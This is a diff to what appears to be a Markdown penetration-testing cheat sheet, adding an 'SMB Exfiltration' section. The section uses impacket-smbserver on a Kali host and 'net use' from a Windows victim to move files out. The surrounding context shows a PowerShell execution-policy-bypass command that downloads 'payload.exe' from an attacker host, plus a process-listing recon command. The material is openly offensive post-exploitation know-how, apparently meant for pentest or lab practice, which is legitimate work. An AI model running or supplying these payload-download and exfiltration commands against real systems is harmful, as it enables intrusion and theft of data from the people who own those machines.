@@ -98,6 +98,11 @@ Downlaod file with Powershell
 ```cmd
 powershell.exe -ep Bypass -c iex ((New-Object System.Net.WebClient).DownloadFile("https://attacker/payload.exe", "C:\Users\user1\payload.exe"))
 ```
+SMB Exfiltration
+```cmd
+kali_op1> impacket-smbserver -smb2support kali `pwd`
+MD-Wind> net use \\10.10.14.14\test
+```
 Information about process
 ```cmd
 tasklist /v
